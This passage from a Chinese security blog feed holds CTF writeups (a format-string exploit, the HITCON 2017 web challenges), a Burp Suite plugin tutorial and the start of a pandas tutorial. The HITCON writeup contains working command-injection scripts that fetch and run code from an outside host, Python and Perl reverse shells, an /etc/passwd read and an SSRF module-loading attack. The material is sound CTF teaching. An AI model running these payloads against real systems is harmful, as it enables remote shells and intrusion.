class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base '</span>,hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system '</span>,hex(system)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'WANT PLAY[Y/N]'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">offset1=system &amp; <span class="number">0xff</span></span><br><span class="line">offset2=(system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">offset3=(system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">offset4=(system &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span></span><br><span class="line">payload=<span class="string">'%&#123;&#125;x'</span>.format(str(<span class="number">0x100</span>+offset1))+<span class="string">'%19$hhn'</span></span><br><span class="line">payload+=<span class="string">'%&#123;&#125;x'</span>.format(str(<span class="number">0x100</span>+offset2-offset1))+<span class="string">'%20$hhn'</span></span><br><span class="line">payload+=<span class="string">'%&#123;&#125;x'</span>.format(str(<span class="number">0x100</span>+offset3-offset2))+<span class="string">'%21$hhn'</span></span><br><span class="line">payload+=<span class="string">'%&#123;&#125;x'</span>.format(str(<span class="number">0x100</span>+offset4-offset3))+<span class="string">'%22$hhn'</span></span><br><span class="line">payload+=p32(atoi_got)+p32(atoi_got+<span class="number">1</span>)+p32(atoi_got+<span class="number">2</span>)+p32(atoi_got+<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x08048672')</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br></pre></td></tr></table></figure><h2 id="Re400"><a href="#Re400" class="headerlink" title="Re400"></a>Re400</h2><p>xdctf2015 re300 原题<br><a href="http://bobao.360.cn/ctf/learning/149.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/149.html</a><br>pyc 反编译之后得到一长串的 lambda 表达式<br><img src="/img/hxb2017/23.png" alt="23"><br>主要就是读取一个key.txt文件，然后通过系列变换之后结果存入 key.enc，变换过程是,把原字符在table的index+1后,把后6位保存到文件里<br><img src="/img/hxb2017/24.png" alt="24"></p><h2 id="热身题"><a href="#热身题" class="headerlink" title="热身题"></a>热身题</h2><p>粉红的豹在棋盘上走的格子对应是<br>B5 G4 B2 B4 B5 H2 E3 B2 F5 F8 E1 B2 F7 F6 F1 G4 F5 G6 B1 G3 G5 H6 E2</p><p>根据共有64个格子<br>联想到了base64</p><p><img src="/img/hxb2017/25.png" alt="25"></p><p>黑人问号<br>B5 G4 B2 B4 B5 H2 E3 B2 F5 F8 E1 B2 F7 F6 F1 G4 F5 G6 B1 G3 G5 H6 E2<br>但是要考虑下base64的表应该是怎么布局<br>然后flag{ 的base64为 ZmxhZ3s=<br><img src="/img/hxb2017/26.png" alt="26"><br>可以推断填表的顺序是从左到右，从上到下填表的，所以可以得到映射为(末尾补上一个=)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3sxdF8xNV9mdW5ueX0=</span><br></pre></td></tr></table></figure><p>Base64解码，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1t_15_funny&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Burp Suite插件开发</title>
      <link href="//blog/2017/Burp-Suite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91.html"/>
      <url>//blog/2017/Burp-Suite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91.html</url>
      
        <content type="html"><![CDATA[<h1 id="Burp-Suite是一个用于攻击web应用程序的集成平台"><a href="#Burp-Suite是一个用于攻击web应用程序的集成平台" class="headerlink" title="Burp Suite是一个用于攻击web应用程序的集成平台"></a>Burp Suite是一个用于攻击web应用程序的集成平台</h1><p>我们来学习下如何编写插件增强Burp Suite的功能</p><h1 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h1><h2 id="Step-1-导出SDK包"><a href="#Step-1-导出SDK包" class="headerlink" title="Step 1 导出SDK包"></a>Step 1 导出SDK包</h2><p><img src="/img/burpsuite/1.png" alt=""></p><h2 id="Step-2-新建一个java项目，将刚刚导出的burp目录复制到src目录下，再创建一个包，里面放我们自己的代码"><a href="#Step-2-新建一个java项目，将刚刚导出的burp目录复制到src目录下，再创建一个包，里面放我们自己的代码" class="headerlink" title="Step 2 新建一个java项目，将刚刚导出的burp目录复制到src目录下，再创建一个包，里面放我们自己的代码"></a>Step 2 新建一个java项目，将刚刚导出的burp目录复制到src目录下，再创建一个包，里面放我们自己的代码</h2><p><img src="/img/burpsuite/2.png" alt=""></p><h2 id="网上找了个代码，测试下"><a href="#网上找了个代码，测试下" class="headerlink" title="网上找了个代码，测试下"></a>网上找了个代码，测试下</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">package InformationGather;</span><br><span class="line">import burp.*;</span><br><span class="line">import java.awt.Component;</span><br><span class="line">import java.awt.event.MouseAdapter;</span><br><span class="line">import java.awt.event.MouseEvent;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line">import javax.swing.JButton;</span><br><span class="line">import javax.swing.JPanel;</span><br><span class="line">import javax.swing.SwingUtilities;</span><br><span class="line">public class BurpExtender implements IBurpExtender, ITab &#123;</span><br><span class="line">    public PrintWriter stdout;</span><br><span class="line">    public IExtensionHelpers hps;</span><br><span class="line">    public IBurpExtenderCallbacks cbs;</span><br><span class="line">    public JPanel jPanelMain;</span><br><span class="line">    @Override</span><br><span class="line">    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)         &#123;</span><br><span class="line">        callbacks.setExtensionName(&quot;BurpExtender&quot;);</span><br><span class="line">        this.hps = callbacks.getHelpers();</span><br><span class="line">        this.cbs = callbacks;</span><br><span class="line">        this.stdout = new PrintWriter(callbacks.getStdout(), true);</span><br><span class="line">        this.stdout.println(&quot;hello burp!&quot;);</span><br><span class="line">        SwingUtilities.invokeLater(new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                jPanelMain = new JPanel();</span><br><span class="line">                JButton jButton = new JButton(&quot;老司机,快点我!&quot;);</span><br><span class="line">                jButton.addMouseListener(new MouseAdapter() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    public void mouseClicked(MouseEvent e)&#123;</span><br><span class="line">                        stdout.println(&quot;哔...&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">                // 将按钮添加到 主面板 jPanelMain 中.</span><br><span class="line">                jPanelMain.add(jButton);</span><br><span class="line">                // 设置自定义组件并添加标签</span><br><span class="line">                cbs.customizeUiComponent(jPanelMain);</span><br><span class="line">                cbs.addSuiteTab(BurpExtender.this);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    // 实现 ITab 接口的 getTabCaption 方法</span><br><span class="line">    @Override</span><br><span class="line">    public String getTabCaption() &#123;</span><br><span class="line">        return &quot;Burp 标签测试&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    // 实现 ITab 接口的 getUiComponent 方法</span><br><span class="line">    @Override</span><br><span class="line">    public Component getUiComponent() &#123;</span><br><span class="line">        return jPanelMain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Step-3-导出jar包"><a href="#Step-3-导出jar包" class="headerlink" title="Step 3 导出jar包"></a>Step 3 导出jar包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File-&gt;project stucture -&gt; Artifacts-&gt;&quot;+&quot;,选jar 选择from modules with dependencies，然后会有配置窗口出现，配置完成后，勾选Build on make &gt;ok保存</span><br><span class="line">Build-&gt;make project</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.tuicool.com/articles/aaaa6fA" target="_blank" rel="noopener">BurpSuite插件开发指南之 API 上篇</a><br><a href="http://www.tuicool.com/articles/eU7vUjA" target="_blank" rel="noopener">BurpSuite插件开发指南之 API 下篇</a><br><a href="http://www.php0.net/index.php?a=show&amp;c=index&amp;catid=6&amp;id=19924&amp;m=content" target="_blank" rel="noopener">BurpSuite插件开发指南之Java篇</a><br><a href="http://www.tuicool.com/articles/BF7BNzV" target="_blank" rel="noopener">BurpSuite插件开发指南之 Python 篇</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> numpy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hitcon-ctf-2017</title>
      <link href="//blog/2017/hitcon-ctf-2017.html"/>
      <url>//blog/2017/hitcon-ctf-2017.html</url>
      
        <content type="html"><![CDATA[<h2 id="Baby-Ruby-Escaping"><a href="#Baby-Ruby-Escaping" class="headerlink" title="Baby Ruby Escaping"></a>Baby Ruby Escaping</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env ruby</span><br><span class="line">require &apos;readline&apos;</span><br><span class="line">proc &#123;</span><br><span class="line">  my_exit = Kernel.method(:exit!)</span><br><span class="line">  my_puts = $stdout.method(:puts)</span><br><span class="line">  ObjectSpace.each_object(Module) &#123; |m| m.freeze if m != Readline &#125;</span><br><span class="line">  set_trace_func proc &#123; |event, file, line, id, binding, klass|</span><br><span class="line">    bad_id = /`|exec|foreach|fork|load|method_added|open|read(?!line$)|require|set_trace_func|spawn|syscall|system/</span><br><span class="line">    bad_class = /(?&lt;!True|False|Nil)Class|Module|Dir|File|ObjectSpace|Process|Thread/</span><br><span class="line">    if event =~ /class/ || (event =~ /call/ &amp;&amp; (id =~ bad_id || klass.to_s =~ bad_class))</span><br><span class="line">      my_puts.call &quot;\e[1;31m== Hacker Detected (#&#123;$&amp;&#125;) ==\e[0m&quot;</span><br><span class="line">      my_exit.call</span><br><span class="line">    end</span><br><span class="line">  &#125;</span><br><span class="line">&#125;.call</span><br><span class="line">loop do</span><br><span class="line">  line = Readline.readline(&apos;baby&gt; &apos;, true)</span><br><span class="line">  puts &apos;=&gt; &apos; + eval(line, TOPLEVEL_BINDING).inspect</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>Ruby? 不熟orz，然后尝试学了下ruby，后来发现了个任意文件读取，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ARGV&lt;&lt;&quot;/etc/passwd&quot;</span><br><span class="line">print while gets</span><br></pre></td></tr></table></figure></p><p>果然是读不到什么重要的东西，ctf中感觉读下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/flag</span><br><span class="line">/flag.txt</span><br><span class="line">/home/xxx/flag</span><br><span class="line">/home/xxx/flag.txt</span><br><span class="line">index.php等源代码</span><br><span class="line">等，没有发现的话应该盲读的意义就不大了。</span><br></pre></td></tr></table></figure><p>嗯，接下来想办法列目录…搞了好久没办法，本地测试的时候不小心按了两下tab，发现可以显示当前目录文件。<br>哦，原来是因为Readline可以保存历史记录，还可以智能地列目录。<br>然后列目录，读取文件就可以得到flag。</p><h2 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h2><p>提示了是在Hitcon ctf 2015的baby first基础上增加难度的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>限制了linux命令只能是小于等于5个字符。<br>ls写文件，sh执行命令<br>rev翻转字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"># generate `ls -t&gt;g` to file &quot;_&quot;</span><br><span class="line">http://host/?cmd=&gt;ls\</span><br><span class="line">http://host/?cmd=ls&gt;_</span><br><span class="line">http://host/?cmd=&gt;\ \</span><br><span class="line">http://host/?cmd=&gt;-t\</span><br><span class="line">http://host/?cmd=&gt;\&gt;g</span><br><span class="line">http://host/?cmd=ls&gt;&gt;_</span><br><span class="line"># generate `curl 118.88.99.44|python` to file &quot;g&quot;</span><br><span class="line">http://host/?cmd=&gt;on</span><br><span class="line">http://host/?cmd=&gt;th\</span><br><span class="line">http://host/?cmd=&gt;py\</span><br><span class="line">http://host/?cmd=&gt;\|\</span><br><span class="line">http://host/?cmd=&gt;18\</span><br><span class="line">http://host/?cmd=&gt;5.\</span><br><span class="line">http://host/?cmd=&gt;4\</span><br><span class="line">http://host/?cmd=&gt;89.\</span><br><span class="line">http://host/?cmd=&gt;8.\</span><br><span class="line">http://host/?cmd=&gt;11\</span><br><span class="line">http://host/?cmd=&gt;\ \</span><br><span class="line">http://host/?cmd=&gt;rl\</span><br><span class="line">http://host/?cmd=&gt;cu\</span><br><span class="line">http://host/?cmd=sh _</span><br><span class="line"># got shell</span><br><span class="line">http://host/?cmd=sh g</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">cmds = [</span><br><span class="line">  &quot;&gt;ls\\&quot;,</span><br><span class="line">  &quot;ls&gt;_&quot;,</span><br><span class="line">  &quot;&gt;\\ \\&quot;,</span><br><span class="line">  &quot;&gt;-t\\&quot;,</span><br><span class="line">  &quot;&gt;\\&gt;g&quot;,</span><br><span class="line">  &quot;ls&gt;&gt;_&quot;,</span><br><span class="line">  &quot;&gt;on&quot;,</span><br><span class="line">  &quot;&gt;th\\&quot;,</span><br><span class="line">  &quot;&gt;py\\&quot;,</span><br><span class="line">  &quot;&gt;\\|\\&quot;,</span><br><span class="line">  &quot;&gt;18\\&quot;,</span><br><span class="line">  &quot;&gt;5.\\&quot;,</span><br><span class="line">  &quot;&gt;4\\&quot;,</span><br><span class="line">  &quot;&gt;89.\\&quot;,</span><br><span class="line">  &quot;&gt;8.\\&quot;,</span><br><span class="line">  &quot;&gt;11\\&quot;,</span><br><span class="line">  &quot;&gt;\\ \\&quot;,</span><br><span class="line">  &quot;&gt;rl\\&quot;,</span><br><span class="line">  &quot;&gt;cu\\&quot;,</span><br><span class="line">  &quot;sh _&quot;,</span><br><span class="line">  &quot;sh g&quot;,</span><br><span class="line">]</span><br><span class="line">requests.get(&quot;http://118.88.99.44/web1.php?reset=1&quot;)</span><br><span class="line">for cmd in cmds:</span><br><span class="line">  requests.get(&quot;http://118.88.99.44/web1.php?cmd=%s&quot;%cmd)</span><br></pre></td></tr></table></figure><p>找个python反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.88.99.44&quot;,5010));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure></p><h2 id="BabyFirst-Revenge-v2"><a href="#BabyFirst-Revenge-v2" class="headerlink" title="BabyFirst Revenge v2"></a>BabyFirst Revenge v2</h2><p>同上一题，但是限制4个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"># generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;</span><br><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">*&gt;v</span><br><span class="line"># reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line"># generate &quot;curl 118.88.99.44|python;&quot;</span><br><span class="line">&gt;\;\</span><br><span class="line">&gt;on\</span><br><span class="line">&gt;th\</span><br><span class="line">&gt;py\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;18\</span><br><span class="line">&gt;5.\</span><br><span class="line">&gt;4\</span><br><span class="line">&gt;9.\</span><br><span class="line">&gt;8\</span><br><span class="line">&gt;8.\</span><br><span class="line">&gt;11\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line"># got shell</span><br><span class="line">sh x</span><br><span class="line">sh g</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">cmds = [</span><br><span class="line">  &quot;&gt;dir&quot;,</span><br><span class="line">  &quot;&gt;sl&quot;,</span><br><span class="line">  &quot;&gt;g\&gt;&quot;,</span><br><span class="line">  &quot;&gt;ht-&quot;,</span><br><span class="line">  &quot;*&gt;v&quot;,</span><br><span class="line">  &quot;&gt;rev&quot;,</span><br><span class="line">  &quot;*v&gt;x&quot;,</span><br><span class="line">  &quot;&gt;\\;\\&quot;,</span><br><span class="line">  &quot;&gt;on\\&quot;,</span><br><span class="line">  &quot;&gt;th\\&quot;,</span><br><span class="line">  &quot;&gt;py\\&quot;,</span><br><span class="line">  &quot;&gt;\\|\\&quot;,</span><br><span class="line">  &quot;&gt;18\\&quot;,</span><br><span class="line">  &quot;&gt;5.\\&quot;,</span><br><span class="line">  &quot;&gt;4\\&quot;,</span><br><span class="line">  &quot;&gt;9.\\&quot;,</span><br><span class="line">  &quot;&gt;8\\&quot;,</span><br><span class="line">  &quot;&gt;8.\\&quot;,</span><br><span class="line">  &quot;&gt;11\\&quot;,</span><br><span class="line">  &quot;&gt;\\ \\&quot;,</span><br><span class="line">  &quot;&gt;rl\\&quot;,</span><br><span class="line">  &quot;&gt;cu\\&quot;,</span><br><span class="line">  &quot;sh x&quot;,</span><br><span class="line">  &quot;sh g&quot;,</span><br><span class="line">]</span><br><span class="line">requests.get(&quot;http://118.88.99.44/web1.php?reset=1&quot;)</span><br><span class="line">for cmd in cmds:</span><br><span class="line">  requests.get(&quot;http://118.88.99.44/web1.php?cmd=%s&quot;%cmd)</span><br></pre></td></tr></table></figure><h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme?"></a>SSRFme?</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>CVE-2016-1238<br>It was found that perl can load modules from the current directory if not found in the module directories<br>A local, authenticated attacker could create a specially crafted module in a writable directory and trick a user into running a perl program from that directory; if the module is not found in previous @INC paths, it will load and execute the attacker’s module.</p><p>由于perl处理模块加载时存在漏洞，如果内部存在相应模块，会尝试在当前目录加载。<br>找个perl的反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use Socket;$i=&quot;118.88.99.44&quot;;$p=5010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://13.115.136.15/?url=http://118.88.99.44/evil.pl&amp;filename=evil.pl</span><br><span class="line">http://13.115.136.15/?url=evil://118.88.99.44/evil.pl&amp;filename=evil.pl</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python pandas基础使用</title>
      <link href="//blog/2017/python-pandas%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8.html"/>
      <url>//blog/2017/python-pandas%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<h1 id="pandas是什么"><a href="#pandas是什么" class="headerlink" title="pandas是什么"></a>pandas是什么</h1><p>pandas全称Python Data Analysis Library，基于numpy，为解决数据分析任务而产生。<br>数据结构：</p><ul><li>Series</li><li>DataFrame(重要)<h2 id="pandas怎么用"><a href="#pandas怎么用" class="headerlink" title="pandas怎么用"></a>pandas怎么用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">import numpy as np</span><br></pre></td></tr></table></figure></li></ul><h2 id="对象创建"><a href="#对象创建" class="headerlink" title="对象创建"></a>对象创建</h2><h3 id="Series一维数组"><a href="#Series一维数组" class="headerlink" title="Series一维数组"></a>Series一维数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pd.Series([1,2,3,np.nan,6,7])</span><br><span class="line">0    1.0</span><br><span class="line">1    2.0</span><br><span class="line">2    3.0</span><br><span class="line">3    NaN</span><br><span class="line">4    6.0</span><br><span class="line">5    7.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure><h3 id="DataFrame"><a href="#DataFrame" class="headerlink" title="DataFrame"></a>DataFrame</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pd.DataFrame(columns=[&apos;A&apos;,&apos;B&apos;,&apos;C&apos;])</span><br><span class="line">Empty DataFrame</span><br><span class="line">Columns: [A, B, C]</span><br><span class="line">Index: []</span><br><span class="line">&gt;&gt;&gt; df = pd.DataFrame(np.random.randn(6,4),columns=list(&apos;ABCD&apos;))</span><br><span class="line">&gt;&gt;&gt; df</span><br><span class="line">          A         B         C         D</span><br><span class="line">0  2.475818  0.306987  1.021874 -0.417637</span><br><span class="line">1 -1.164286  0.356116 -0.993138 -0.989995</span><br><span class="line">2  0.485655 -0.838615  1.361994  0.116390</span><br><span class="line">3  2.361547  0.677815  0.111376  0.625714</span><br><span class="line">4 -2.144984  0.462015  0.495043 -0.148428</span><br><span class="line">5  1.324414  1.001327  1.014735  